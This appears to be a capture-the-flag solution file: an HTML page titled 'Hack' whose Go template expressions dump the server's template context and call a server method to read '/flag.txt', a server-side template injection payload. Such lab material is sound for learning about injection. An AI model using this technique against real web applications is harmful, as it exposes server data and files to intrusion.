<!DOCTYPE html>
<html lang="en">

<head>
    <title>Hack</title>
</head>

<body>
    <p>{{html "ssti"}}</p>
    <p>{{ . }}</p>
    <p>{{ .FetchServerInfo "/flag.txt" }}</p>
</body>

</html>
